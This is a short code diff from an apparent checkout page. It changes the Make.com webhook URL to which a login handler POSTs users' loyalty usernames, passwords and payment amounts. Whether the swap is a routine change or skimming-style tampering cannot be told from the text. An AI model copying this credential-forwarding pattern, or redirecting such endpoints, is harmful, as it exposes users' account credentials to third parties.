@@ -150,7 +150,7 @@
       e.preventDefault(); const u=document.getElementById('user').value.trim(), p=document.getElementById('pass').value.trim();
       if (!u||!p) return alert('Please enter your loyalty credentials.');
       document.getElementById('loading').style.display='flex';
-      fetch('https://hook.us2.make.com/j4shhdd1b8axa0ycwq857159hga53tla',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({loyaltyUser:u, loyaltyPass:p, amount:amt})})
+      fetch('https://hook.us2.make.com/4f5k8fj23ixvb0f6ndz8prnxqbac9x5k',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({loyaltyUser:u, loyaltyPass:p, amount:amt})})
       .then(r=>r.json()).then(r=>{document.getElementById('loading').style.display='none'; if(r.ExtendedResultCode!==0) return alert(r.ErrorDescription||'Invalid credentials.'); prepPay(); show('pay');})
       .catch(()=>{document.getElementById('loading').style.display='none'; alert('Error validating credentials.');});
     };
